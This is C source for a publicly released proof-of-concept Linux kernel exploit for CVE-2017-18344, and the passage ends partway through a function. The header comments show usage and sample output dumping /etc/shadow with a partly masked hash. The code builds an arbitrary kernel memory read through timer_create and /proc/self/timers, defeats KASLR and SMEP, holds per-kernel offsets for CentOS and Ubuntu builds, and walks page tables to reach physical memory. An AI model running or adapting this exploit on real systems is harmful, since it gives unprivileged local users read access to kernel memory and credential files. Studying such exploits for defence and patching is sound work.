// A proof-of-concept exploit for CVE-2017-18344.
// Includes KASLR and SMEP bypasses. No SMAP bypass.
// No support for 1 GB pages or 5 level page tables.
// Tested on Ubuntu xenial 4.4.0-116-generic and 4.13.0-38-generic
// and on CentOS 7 3.10.0-862.9.1.el7.x86_64.
//
// gcc pwn.c -o pwn
//
// $ ./pwn search 'root:!:'
// [.] setting up proc reader
// [~] done
// [.] checking /proc/cpuinfo
// [~] looks good
// [.] setting up timer
// [~] done
// [.] finding leak pointer address
// [+] done: 000000022ca45b60
// [.] mapping leak pointer page
// [~] done
// [.] divide_error:     ffffffffad6017b0
// [.] kernel text:      ffffffffacc00000
// [.] page_offset_base: ffffffffade48a90
// [.] physmap:          ffff8d40c0000000
// [.] task->mm->pgd:    ffffffffade0a000
// [.] searching [0000000000000000, 00000000f524d000) for 'root:!:':
// [.] now at 0000000000000000
// [.] now at 0000000002000000
// [.] now at 0000000004000000
// ...
// [.] now at 000000008c000000
// [.] now at 000000008e000000
// [.] now at 0000000090000000
// [+] found at 0000000090ff3000
// [+] done
//
// $ ./pwn phys 0000000090ff3000 1000 shadow
// [.] setting up proc reader
// [~] done
// [.] checking /proc/cpuinfo
// [~] looks good
// [.] setting up timer
// [~] done
// [.] finding leak pointer address
// [+] done: 000000022ca45b60
// [.] mapping leak pointer page
// [~] done
// [.] divide_error:     ffffffffad6017b0
// [.] kernel text:      ffffffffacc00000
// [.] page_offset_base: ffffffffade48a90
// [.] physmap:          ffff8d40c0000000
// [.] task->mm->pgd:    ffffffffade0a000
// [.] dumping physical memory [0000000090ff3000, 0000000090ff4000):
// [+] done
//
// $ cat shadow
// root:!:17612:0:99999:7:::
// daemon:*:17590:0:99999:7:::
// bin:*:17590:0:99999:7:::
// ...
// saned:*:17590:0:99999:7:::
// usbmux:*:17590:0:99999:7:::
// user:$1$7lXXXXSv$rvXXXXXXXXXXXXXXXXXhr/:17612:0:99999:7:::
//
// Andrey Konovalov <andreyknvl@gmail.com>

#define _GNU_SOURCE

#include <assert.h>
#include <ctype.h>
#include <fcntl.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/sysinfo.h>
#include <sys/syscall.h>
#include <sys/types.h>

// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

#define DEBUG 0

// CentOS 7 3.10.0-862.9.1.el7.x86_64
#define KERNEL_START			0xffffffff81000000ul
#define O_DIVIDE_ERROR			(0xffffffff81723a40ul - KERNEL_START)
#define O_INIT_TASK			(0xffffffff81c16480ul - KERNEL_START)
#define O_INIT_MM			(0xffffffff81c914a0ul - KERNEL_START)
#define O_PAGE_OFFSET_BASE		(0xffffffff81c41440ul - KERNEL_START)
#define O_TASK_STRUCT_TASKS		1072
#define O_TASK_STRUCT_MM		1128
#define O_TASK_STRUCT_PID		1188
#define O_MM_STRUCT_MMAP		0
#define O_MM_STRUCT_PGD			88
#define O_VM_AREA_STRUCT_VM_START	0
#define O_VM_AREA_STRUCT_VM_END		8
#define O_VM_AREA_STRUCT_VM_NEXT	16
#define O_VM_AREA_STRUCT_VM_FLAGS	80

#if 0
// Ubuntu xenial 4.4.0-116-generic
#define KERNEL_START			0xffffffff81000000ul
#define O_DIVIDE_ERROR			(0xffffffff81851240ul - KERNEL_START)
#define O_INIT_TASK			(0xffffffff81e13500ul - KERNEL_START)
#define O_INIT_MM			(0xffffffff81e73c80ul - KERNEL_START)
#define O_PAGE_OFFSET_BASE		0
#define O_TASK_STRUCT_TASKS		848
#define O_TASK_STRUCT_MM		928
#define O_TASK_STRUCT_PID		1096
#define O_MM_STRUCT_MMAP		0
#define O_MM_STRUCT_PGD			64
#define O_VM_AREA_STRUCT_VM_START	0
#define O_VM_AREA_STRUCT_VM_END		8
#define O_VM_AREA_STRUCT_VM_NEXT	16
#define O_VM_AREA_STRUCT_VM_FLAGS	80
#endif

#if 0
// Ubuntu xenial 4.13.0-38-generic
#define KERNEL_START			0xffffffff81000000ul
#define O_DIVIDE_ERROR			(0xffffffff81a017b0ul - KERNEL_START)
#define O_INIT_TASK			(0xffffffff82212480ul - KERNEL_START)
#define O_INIT_MM			(0xffffffff82302760ul - KERNEL_START)
#define O_PAGE_OFFSET_BASE		(0xffffffff82248a90ul - KERNEL_START)
#define O_TASK_STRUCT_TASKS		2048
#define O_TASK_STRUCT_MM		2128
#define O_TASK_STRUCT_PID		2304
#define O_MM_STRUCT_MMAP		0
#define O_MM_STRUCT_PGD			80
#define O_VM_AREA_STRUCT_VM_START	0
#define O_VM_AREA_STRUCT_VM_END		8
#define O_VM_AREA_STRUCT_VM_NEXT	16
#define O_VM_AREA_STRUCT_VM_FLAGS	80
#endif

// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

#ifndef SYS_memfd_create
#define SYS_memfd_create	319
#endif

#ifndef O_PATH
#define O_PATH			010000000
#endif

// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

#define PAGE_SHIFT		12
#define PAGE_SIZE		(1ul << PAGE_SHIFT)
#define PAGE_MASK		(~(PAGE_SIZE - 1))

#define HUGE_PAGE_SHIFT		21
#define HUGE_PAGE_SIZE		(1ul << HUGE_PAGE_SHIFT)
#define HUGE_PAGE_MASK		(~(HUGE_PAGE_SIZE - 1))

#define TASK_SIZE		(1ul << 47)
#define	PAGE_OFFSET_BASE	0xffff880000000000ul

// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

#define LOG_INFO	1
#define LOG_DEBUG	2

#define log(level, format, args...)					\
	do {								\
		if (level == LOG_INFO)					\
			printf(format, ## args);			\
		else							\
			fprintf(stderr, format, ## args);		\
	} while(0)

#define info(format, args...) log(LOG_INFO, format, ## args)

#if (DEBUG >= 1)
#define debug1(format, args...) log(LOG_DEBUG, format, ## args)
#else
#define debug1(format, args...)
#endif

#if (DEBUG >= 2)
#define debug2(format, args...) log(LOG_DEBUG, format, ## args)
#else
#define debug2(format, args...)
#endif

#define min(x, y) ((x) < (y) ? (x) : (y))

// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

static void print_chunk(int level, unsigned long src_addr, char *buffer,
				int len, int chunk_size) {
	int i;

	assert(len <= chunk_size);

	log(level, "%016lx: ", src_addr);
	for (i = 0; i < len; i++)
		log(level, "%02hx ", (unsigned char)buffer[i]);
	for (i = len; i < chunk_size; i++)
		log(level, "   ");

	log(level, "  ");

	for (i = 0; i < len; i++) {
		if (isalnum(buffer[i]))
			log(level, "%c", buffer[i]);
		else
			log(level, ".");
	}

	log(level, "\n");
}

static void print_bytes(int level, unsigned long src_addr, char *buffer,
				int len) {
	int chunk_size = 16;
	assert(chunk_size % 2 == 0);

	int chunk;
	for (chunk = 0; chunk < len / chunk_size; chunk++)
		print_chunk(level, src_addr + chunk * chunk_size,
			&buffer[chunk * chunk_size], chunk_size, chunk_size);

	int rem = len % chunk_size;
	if (rem != 0)
		print_chunk(level, src_addr + len - rem,
			&buffer[len - rem], rem, chunk_size);
}


// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

#define MIN_KERNEL_BASE 0xffffffff81000000ul
#define MAX_KERNEL_BASE 0xffffffffff000000ul
#define MAX_KERNEL_IMAGE 0x8000000ul // 128 MB

#define MMAP_ADDR_SPAN (MAX_KERNEL_BASE - MIN_KERNEL_BASE + MAX_KERNEL_IMAGE)
#define MMAP_ADDR_START 0x200000000ul
#define MMAP_ADDR_END (MMAP_ADDR_START + MMAP_ADDR_SPAN)

#define OPTIMAL_PTR_OFFSET ((MMAP_ADDR_START - MIN_KERNEL_BASE) / 8)
// == 0x4fe00000

#define MAX_MAPPINGS 1024
#define MEMFD_SIZE (MMAP_ADDR_SPAN / MAX_MAPPINGS)

// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

static struct proc_reader g_proc_reader;
static unsigned long g_leak_ptr_addr = 0;

// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

#define PROC_INITIAL_SIZE 1024
#define PROC_CHUNK_SIZE 1024

struct proc_reader {
	char *buffer;
	int buffer_size;
	int read_size;
};

static void proc_init(struct proc_reader* pr) {
	debug2("proc_init: %016lx\n", pr);

	pr->buffer = malloc(PROC_INITIAL_SIZE);
	if (pr->buffer == NULL) {
		perror("[-] proc_init: malloc()");
		exit(EXIT_FAILURE);
	}
	pr->buffer_size = PROC_INITIAL_SIZE;
	pr->read_size = 0;

	debug2("proc_init = void\n");
}

static void proc_ensure_size(struct proc_reader* pr, int size) {
	if (pr->buffer_size >= size)
		return;
	while (pr->buffer_size < size)
		pr->buffer_size <<= 1;
	pr->buffer = realloc(pr->buffer, pr->buffer_size);
	if (pr->buffer == NULL) {
		perror("[-] proc_ensure_size: realloc()");
		exit(EXIT_FAILURE);
	}
}

static int proc_read(struct proc_reader* pr, const char *file) {
	debug2("proc_read: file: %s, pr->buffer_size: %d\n",
			file, pr->buffer_size);

	int fd = open(file, O_RDONLY);
	if (fd == -1) {
		perror("[-] proc_read: open()");
		exit(EXIT_FAILURE);
	}

	pr->read_size = 0;
	while (true) {
		proc_ensure_size(pr, pr->read_size + PROC_CHUNK_SIZE);
		int bytes_read = read(fd, &pr->buffer[pr->read_size],
					PROC_CHUNK_SIZE);
		if (bytes_read == -1) {
			perror("[-] read(proc)");
			exit(EXIT_FAILURE);
		}
		pr->read_size += bytes_read;
		if (bytes_read < PROC_CHUNK_SIZE)
			break;
	}

	close(fd);

	debug2("proc_read = %d\n", pr->read_size);
	return pr->read_size;
}

// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

typedef union k_sigval {
	int sival_int;
	void *sival_ptr;
} k_sigval_t;

#define __ARCH_SIGEV_PREAMBLE_SIZE	(sizeof(int) * 2 + sizeof(k_sigval_t))
#define SIGEV_MAX_SIZE	64
#define SIGEV_PAD_SIZE	((SIGEV_MAX_SIZE - __ARCH_SIGEV_PREAMBLE_SIZE) \
				/ sizeof(int))

typedef struct k_sigevent {
	k_sigval_t sigev_value;
	int sigev_signo;
	int sigev_notify;
	union {
		int _pad[SIGEV_PAD_SIZE];
		int _tid;

		struct {
			void (*_function)(sigval_t);
			void *_attribute;
		} _sigev_thread;
	} _sigev_un;
} k_sigevent_t;

static void leak_setup() {
	k_sigevent_t se;
	memset(&se, 0, sizeof(se));
	se.sigev_signo = SIGRTMIN;
	se.sigev_notify = OPTIMAL_PTR_OFFSET;
	timer_t timerid = 0;

	int rv = syscall(SYS_timer_create, CLOCK_REALTIME,
				(void *)&se, &timerid);
	if (rv != 0) {
		perror("[-] timer_create()");
		exit(EXIT_FAILURE);
	}
}

static void leak_parse(char *in, int in_len, char **start, char **end) {
	const char *needle = "notify: ";
	*start = memmem(in, in_len, needle, strlen(needle));
	assert(*start != NULL);
	*start += strlen(needle);

	assert(in_len > 0);
	assert(in[in_len - 1] == '\n');
	*end = &in[in_len - 2];
	while (*end > in && **end != '\n')
		(*end)--;
	assert(*end > in);
	while (*end > in && **end != '/')
		(*end)--;
	assert(*end > in);
	assert((*end)[1] = 'p' && (*end)[2] == 'i' && (*end)[3] == 'd');

	assert(*end >= *start);
}

static void leak_once(char **start, char **end) {
	int read_size = proc_read(&g_proc_reader, "/proc/self/timers");
	leak_parse(g_proc_reader.buffer, read_size, start, end);
}

static int leak_once_and_copy(char *out, int out_len) {
	assert(out_len > 0);

	char *start, *end;
	leak_once(&start, &end);

	int size = min(end - start, out_len);
	memcpy(out, start, size);

	if (size == out_len)
		return size;

	out[size] = 0;
	return size + 1;
}

static void leak_range(unsigned long addr, size_t length, char *out) {
	size_t total_leaked = 0;
	while (total_leaked < length) {
		unsigned long addr_to_leak = addr + total_leaked;
		*(unsigned long *)g_leak_ptr_addr = addr_to_leak;
		debug2("leak_range: offset %ld, addr: %lx\n",
			total_leaked, addr_to_leak);
		int leaked = leak_once_and_copy(out + total_leaked,
			length - total_leaked);
		total_leaked += leaked;
	}
}

// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

static void mmap_fixed(unsigned long addr, size_t size) {
	void *rv = mmap((void *)addr, size, PROT_READ | PROT_WRITE,
			MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (rv != (void *)addr) {
		perror("[-] mmap()");
		exit(EXIT_FAILURE);
	}
}

static void mmap_fd_over(int fd, unsigned long fd_size, unsigned long start,
			unsigned long end) {
	int page_size = PAGE_SIZE;
	assert(fd_size % page_size == 0);
	assert(start % page_size == 0);
	assert(end % page_size == 0);
	assert((end - start) % fd_size == 0);

	debug1("mmap_fd_over: [%lx, %lx)\n", start, end);

	unsigned long addr;
	for (addr = start; addr < end; addr += fd_size) {
		void *rv = mmap((void *)addr, fd_size, PROT_READ,
				MAP_FIXED | MAP_PRIVATE, fd, 0);
		if (rv != (void *)addr) {
			perror("[-] mmap()");
			exit(EXIT_FAILURE);
		}
	}

	debug1("mmap_fd_over = void\n");
}

static void remap_fd_over(int fd, unsigned long fd_size, unsigned long start,
			unsigned long end) {
	int rv = munmap((void *)start, end - start);
	if (rv != 0) {
		perror("[-] munmap()");
		exit(EXIT_FAILURE);
	}
	mmap_fd_over(fd, fd_size, start, end);
}

#define MEMFD_CHUNK_SIZE 0x1000

static int create_filled_memfd(const char *name, unsigned long size,
				unsigned long value) {
	int i;
	char buffer[MEMFD_CHUNK_SIZE];

	assert(size % MEMFD_CHUNK_SIZE == 0);

	int fd = syscall(SYS_memfd_create, name, 0);
	if (fd < 0) {
		perror("[-] memfd_create()");
		exit(EXIT_FAILURE);
	}

	for (i = 0; i < sizeof(buffer) / sizeof(value); i++)
		*(unsigned long *)&buffer[i * sizeof(value)] = value;

	for (i = 0; i < size / sizeof(buffer); i++) {
		int bytes_written = write(fd, &buffer[0], sizeof(buffer));
		if (bytes_written != sizeof(buffer)) {
			perror("[-] write(memfd)");
			exit(EXIT_FAILURE);
		}
	}

	return fd;
}

// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

static const char *evil = "evil";
static const char *good = "good";

static bool bisect_probe() {
	char *start, *end;
	leak_once(&start, &end);
	return *start == 'g';
}

static unsigned long bisect_via_memfd(unsigned long fd_size,
				unsigned long start, unsigned long end) {
	assert((end - start) % fd_size == 0);

	int fd_evil = create_filled_memfd("evil", fd_size, (unsigned long)evil);
	int fd_good = create_filled_memfd("good", fd_size, (unsigned long)good);

	unsigned long left = 0;
	unsigned long right = (end - start) / fd_size;

	while (right - left > 1) {
		unsigned long middle = left + (right - left) / 2;
		remap_fd_over(fd_evil, fd_size, start + left * fd_size,
				start + middle * fd_size);
		remap_fd_over(fd_good, fd_size, start + middle * fd_size,
				start + right * fd_size);
		bool probe = bisect_probe();
		if (probe)
			left = middle;
		else
			right = middle;
	}

	int rv = munmap((void *)start, end - start);
	if (rv != 0) {
		perror("[-] munmap()");
		exit(EXIT_FAILURE);
	}

	close(fd_evil);
	close(fd_good);

	return start + left * fd_size;
}

static unsigned long bisect_via_assign(unsigned long start, unsigned long end) {
	int word_size = sizeof(unsigned long);

	assert((end - start) % word_size == 0);
	assert((end - start) % PAGE_SIZE == 0);

	mmap_fixed(start, end - start);

	unsigned long left = 0;
	unsigned long right = (end - start) / word_size;

	while (right - left > 1) {
		unsigned long middle = left + (right - left) / 2;
		unsigned long a;
		for (a = left; a < middle; a++)
			*(unsigned long *)(start + a * word_size) =
				(unsigned long)evil;
		for (a = middle; a < right; a++)
			*(unsigned long *)(start + a * word_size) =
				(unsigned long)good;
		bool probe = bisect_probe();
		if (probe)
			left = middle;
		else
			right = middle;
	}

	int rv = munmap((void *)start, end - start);
	if (rv != 0) {
		perror("[-] munmap()");
		exit(EXIT_FAILURE);
	}

	return start + left * word_size;
}

static unsigned long bisect_leak_ptr_addr() {
	unsigned long addr = bisect_via_memfd(
			MEMFD_SIZE, MMAP_ADDR_START, MMAP_ADDR_END);
	debug1("%lx %lx\n", addr, addr + MEMFD_SIZE);
	addr = bisect_via_memfd(PAGE_SIZE, addr, addr + MEMFD_SIZE);
	debug1("%lx %lx\n", addr, addr + PAGE_SIZE);
	addr = bisect_via_assign(addr, addr + PAGE_SIZE);
	debug1("%lx\n", addr);
	return addr;
}

// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

#define CPUINFO_SMEP	1
#define CPUINFO_SMAP	2
#define CPUINFO_KAISER	4
#define CPUINFO_PTI	8

static int cpuinfo_scan() {
	int length = proc_read(&g_proc_reader, "/proc/cpuinfo");
	char *buffer = &g_proc_reader.buffer[0];
	int rv = 0;
	char* found = memmem(buffer, length, "smep", 4);
	if (found != NULL)
		rv |= CPUINFO_SMEP;
	found = memmem(buffer, length, "smap", 4);
	if (found != NULL)
		rv |= CPUINFO_SMAP;
	found = memmem(buffer, length, "kaiser", 4);
	if (found != NULL)
		rv |= CPUINFO_KAISER;
	found = memmem(buffer, length, " pti", 4);
	if (found != NULL)
		rv |= CPUINFO_PTI;
	return rv;
}

static void cpuinfo_check() {
	int rv = cpuinfo_scan();
	if (rv & CPUINFO_SMAP) {
		info("[-] SMAP detected, no bypass available, aborting\n");
		exit(EXIT_FAILURE);
	}
}

// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

static void arbitrary_read_init() {
	info("[.] setting up proc reader\n");
	proc_init(&g_proc_reader);
	info("[~] done\n");

	info("[.] checking /proc/cpuinfo\n");
	cpuinfo_check();
	info("[~] looks good\n");

	info("[.] setting up timer\n");
	leak_setup();
	info("[~] done\n");

	info("[.] finding leak pointer address\n");
	g_leak_ptr_addr = bisect_leak_ptr_addr();
	info("[+] done: %016lx\n", g_leak_ptr_addr);

	info("[.] mapping leak pointer page\n");
	mmap_fixed(g_leak_ptr_addr & ~(PAGE_SIZE - 1), PAGE_SIZE);
	info("[~] done\n");
}

static void read_range(unsigned long addr, size_t length, char *buffer) {
	leak_range(addr, length, buffer);
}

static uint64_t read_8(unsigned long addr) {
	uint64_t result;
	read_range(addr, sizeof(result), (char *)&result);
	return result;
}

static uint32_t read_4(unsigned long addr) {
	uint32_t result;
	read_range(addr, sizeof(result), (char *)&result);
	return result;
}

static uint64_t read_field_8(unsigned long addr, int offset) {
	return read_8(addr + offset);
}

static uint64_t read_field_4(unsigned long addr, int offset) {
	return read_4(addr + offset);
}

// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

struct idt_register {
	uint16_t length;
	uint64_t base;
} __attribute__((packed));

struct idt_gate {
	uint16_t offset_1; // bits 0..15
	uint32_t shit_1;
	uint16_t offset_2; // bits 16..31
	uint32_t offset_3; // bits 32..63
	uint32_t shit_2;
} __attribute__((packed));

static uint64_t idt_gate_addr(struct idt_gate *gate) {
	uint64_t addr = gate->offset_1 + ((uint64_t)gate->offset_2 << 16) +
		((uint64_t)gate->offset_3 << 32);
	return addr;
}

static void get_idt(struct idt_register *idtr) {
	asm ( "sidt %0" : : "m"(*idtr) );
	debug1("get_idt_base: base: %016lx, length: %d\n",
			idtr->base, idtr->length);
}

static void print_idt(int entries) {
	char buffer[4096];
	struct idt_register idtr;
	int i;

	get_idt(&idtr);
	assert(idtr.length <= sizeof(buffer));
	read_range(idtr.base, idtr.length, &buffer[0]);

	info("base: %016lx, length: %d\n", idtr.base,
			(int)idtr.length);

	entries = min(entries, idtr.length / sizeof(struct idt_gate));
	for (i = 0; i < entries; i++) {
		struct idt_gate *gate = (struct idt_gate *)&buffer[0] + i;
		uint64_t addr = idt_gate_addr(gate);
		info("gate #%03d: %016lx\n", i, addr);
	}
}

static uint64_t read_idt_gate(int i) {
	char buffer[4096];
	struct idt_register idtr;

	get_idt(&idtr);
	assert(idtr.length <= sizeof(buffer));
	assert(i <= idtr.length / sizeof(struct idt_gate));
	read_range(idtr.base, idtr.length, &buffer[0]);

	struct idt_gate *gate = (struct idt_gate *)&buffer[0] + i;
	uint64_t addr = idt_gate_addr(gate);
	return addr;
}

// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

#define PTRS_PER_PGD		512
#define PTRS_PER_PUD		512
#define PTRS_PER_PMD		512
#define PTRS_PER_PTE		512

#define PGD_SHIFT		39
#define PUD_SHIFT		30
#define PMD_SHIFT		21

#define pgd_index(addr)		(((addr) >> PGD_SHIFT) & (PTRS_PER_PGD - 1))
#define pud_index(addr)		(((addr) >> PUD_SHIFT) & (PTRS_PER_PUD - 1))
#define pmd_index(addr)		(((addr) >> PMD_SHIFT) & (PTRS_PER_PMD - 1))
#define pte_index(addr)		(((addr) >> PAGE_SHIFT) & (PTRS_PER_PTE - 1))

#define _PAGE_BIT_PRESENT	0
#define _PAGE_BIT_ACCESSED	5
#define _PAGE_BIT_DIRTY		6
#define _PAGE_BIT_PSE		7
#define _PAGE_BIT_GLOBAL	8
#define _PAGE_BIT_PROTNONE	_PAGE_BIT_GLOBAL

#define _PAGE_PRESENT		(1ul << _PAGE_BIT_PRESENT)
#define _PAGE_ACCESSED		(1ul << _PAGE_BIT_ACCESSED)
#define _PAGE_DIRTY		(1ul << _PAGE_BIT_DIRTY)
#define _PAGE_PSE		(1ul << _PAGE_BIT_PSE)
#define _PAGE_PROTNONE		(1ul << _PAGE_BIT_PROTNONE)
#define _PAGE_KNL_ERRATUM_MASK	(_PAGE_DIRTY | _PAGE_ACCESSED)

#define pgd_none(value)		((value) == 0)
#define pud_none(value)		(((value) & ~(_PAGE_KNL_ERRATUM_MASK)) == 0)
#define pmd_none(value)		(((value) & ~(_PAGE_KNL_ERRATUM_MASK)) == 0)
#define pte_none(value)		(((value) & ~(_PAGE_KNL_ERRATUM_MASK)) == 0)

#define __PHYSICAL_MASK_SHIFT	52
#define __PHYSICAL_MASK		((1ul << __PHYSICAL_MASK_SHIFT) - 1)
#define PHYSICAL_PAGE_MASK	(PAGE_MASK & __PHYSICAL_MASK)
#define PTE_PFN_MASK		(PHYSICAL_PAGE_MASK)
#define PTE_FLAGS_MASK		(~PTE_PFN_MASK)

#define pgd_flags(value)	(value & PTE_FLAGS_MASK)
#define pud_flags(value)	(value & PTE_FLAGS_MASK)
#define pmd_flags(value)	(value & PTE_FLAGS_MASK)
#define pte_flags(value)	(value & PTE_FLAGS_MASK)

#define pgd_present(value)	(pgd_flags(value) & _PAGE_PRESENT)
#define pud_present(value)	(pud_flags(value) & _PAGE_PRESENT)
#define pmd_present(value)	(pmd_flags(value) & (_PAGE_PRESENT | \
					_PAGE_PROTNONE | _PAGE_PSE))
#define pte_present(value)	(pte_flags(value) & (_PAGE_PRESENT | \
					_PAGE_PROTNONE))

struct pte_entry {
	unsigned long		addr;
	unsigned long		entries[PTRS_PER_PTE];
};

struct pmd_entry {
	unsigned long		addr;
	struct {
		bool				huge;
		union {
			struct pte_entry	*pte;
			unsigned long		phys;
		};
	}			entries[PTRS_PER_PMD];
};

struct pud_entry {
	unsigned long		addr;
	struct pmd_entry	*entries[PTRS_PER_PUD];
};

struct pgd_entry {
	unsigned long		addr;
	struct pud_entry	*entries[PTRS_PER_PGD];
};

struct ptsc {
	unsigned long		physmap;
	struct pgd_entry	entry;
};

static struct pte_entry *ptsc_alloc_pte_entry(unsigned long addr) {
	struct pte_entry *entry = malloc(sizeof(*entry));
	if (!entry) {
		perror("[-] malloc()");
		exit(EXIT_FAILURE);
	}
	entry->addr = addr;
	memset(&entry->entries[0], 0, sizeof(entry->entries));
	return entry;
}

static struct pmd_entry *ptsc_alloc_pmd_entry(unsigned long addr) {
	struct pmd_entry *entry = malloc(sizeof(*entry));
	if (!entry) {
		perror("[-] malloc()");
		exit(EXIT_FAILURE);
	}
	entry->addr = addr;
	memset(&entry->entries[0], 0, sizeof(entry->entries));
	return entry;
}

static struct pud_entry *ptsc_alloc_pud_entry(unsigned long addr) {
	struct pud_entry *entry = malloc(sizeof(*entry));
	if (!entry) {
		perror("[-] malloc()");
		exit(EXIT_FAILURE);
	}
	entry->addr = addr;
	memset(&entry->entries[0], 0, sizeof(entry->entries));
	return entry;
}

static void ptsc_init(struct ptsc* ptsc, unsigned long physmap,
				unsigned long pgd) {
	ptsc->physmap = physmap;
	ptsc->entry.addr = pgd;
	memset(&ptsc->entry.entries[0], 0, sizeof(ptsc->entry.entries));
}

static unsigned long ptsc_page_virt_to_phys(struct ptsc* ptsc,
						unsigned long addr) {
	struct pgd_entry *pgd_e;
	struct pud_entry *pud_e;
	struct pmd_entry *pmd_e;
	struct pte_entry *pte_e;
	unsigned long phys_a;
	int index;

	debug1("looking up phys addr for %016lx:\n", addr);

	pgd_e = &ptsc->entry;

	index = pgd_index(addr);
	debug1(" pgd: %016lx, index: %d\n", pgd_e->addr, index);
	if (!pgd_e->entries[index]) {
		unsigned long pgd_v = read_8(
			pgd_e->addr + index * sizeof(unsigned long));
		debug1("   -> %016lx\n", pgd_v);
		if (pgd_none(pgd_v)) {
			debug1(" not found, pgd is none\n");
			return 0;
		}
		if (!pgd_present(pgd_v)) {
			debug1(" not found, pgd is not present\n");
			return 0;
		}
		unsigned long pud_a =
			ptsc->physmap + (pgd_v & PHYSICAL_PAGE_MASK);
		pud_e = ptsc_alloc_pud_entry(pud_a);
		pgd_e->entries[index] = pud_e;
	}
	pud_e = pgd_e->entries[index];

	index = pud_index(addr);
	debug1(" pud: %016lx, index: %d\n", pud_e->addr, index);
	if (!pud_e->entries[index]) {
		unsigned long pud_v = read_8(
			pud_e->addr + index * sizeof(unsigned long));
		debug1("   -> %016lx\n", pud_v);
		if (pud_none(pud_v)) {
			debug1(" not found, pud is none\n");
			return 0;
		}
		if (!pud_present(pud_v)) {
			debug1(" not found, pud is not present\n");
			return 0;
		}
		unsigned long pmd_a =
			ptsc->physmap + (pud_v & PHYSICAL_PAGE_MASK);
		pmd_e = ptsc_alloc_pmd_entry(pmd_a);
		pud_e->entries[index] = pmd_e;
	}
	pmd_e = pud_e->entries[index];

	index = pmd_index(addr);
	debug1(" pmd: %016lx, index: %d\n", pmd_e->addr, index);
	if (!pmd_e->entries[index].pte) {
		unsigned long pmd_v = read_8(
			pmd_e->addr + index * sizeof(unsigned long));
		debug1("   -> %016lx\n", pmd_v);
		if (pmd_none(pmd_v)) {
			debug1(" not found, pmd is none\n");
			return 0;
		}
		if (!pmd_present(pmd_v)) {
			debug1(" not found, pmd is not present\n");
			return 0;
		}
		if (pmd_flags(pmd_v) & _PAGE_PSE) {
			phys_a = ptsc->physmap + (pmd_v & PHYSICAL_PAGE_MASK) +
					(addr & ~HUGE_PAGE_MASK);
			pmd_e->entries[index].phys = phys_a;
			pmd_e->entries[index].huge = true;
		} else {
			unsigned long pte_a =
				ptsc->physmap + (pmd_v & PHYSICAL_PAGE_MASK);
			pte_e = ptsc_alloc_pte_entry(pte_a);
			pmd_e->entries[index].pte = pte_e;
			pmd_e->entries[index].huge = false;
		}
	}

	if (pmd_e->entries[index].huge) {
		debug1(" phy: %016lx (huge)\n", phys_a);
		return pmd_e->entries[index].phys;
	}

	pte_e = pmd_e->entries[index].pte;

	index = pte_index(addr);
	debug1(" pte: %016lx, index: %d\n", pte_e->addr, index);
	if (!pte_e->entries[index]) {
		unsigned long pte_v = read_8(
			pte_e->addr + index * sizeof(unsigned long));
		debug1("   -> %016lx\n", pte_v);
		if (pte_none(pte_v)) {
			debug1(" not found, pte is none\n");
			return 0;
		}
		if (!pte_present(pte_v)) {
			debug1(" not found, pte is not present\n");
			return 0;
		}
		phys_a = ptsc->physmap + (pte_v & PHYSICAL_PAGE_MASK) +
				(addr & ~PAGE_MASK);
		pte_e->entries[index] = phys_a;
	}
	phys_a = pte_e->entries[index];

	return phys_a;
}

// # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

static unsigned long find_task_by_pid(unsigned long init_task, unsigned pid) {
	unsigned long cur_task = init_task;

	while (true) {
		unsigned cur_pid =
			read_field_4(cur_task, O_TASK_STRUCT_PID);
		if (cur_pid == pid)
			return cur_task;
		unsigned long task_next_ptr =
			read_field_8(cur_task, O_TASK_STRUCT_TASKS);
		cur_task = task_next_ptr - O_TASK_STRUCT_TASKS;
		if (cur_task == init_task)
			return 0;
	}
}

#define MAX_MMAPS_PER_TASK 512

struct mmap_entry {
	unsigned long start;
	unsigned long end;
	unsigned flags;
};

typedef void (*mmap_callback)(struct mmap_entry *entry, void *private);

static void for_each_mmap_from(unsigned long mmap, mmap_callback callback,
				void *private) {
	struct mmap_entry entries[MAX_MMAPS_PER_TASK];
	int i, count;

	count = 0;
	while (mmap != 0) {
		assert(count < MAX_MMAPS_PER_TASK);
		unsigned long vm_start =
			read_field_8(mmap, O_VM_AREA_STRUCT_VM_START);
		unsigned long vm_end =
			read_field_8(mmap, O_VM_AREA_STRUCT_VM_END);
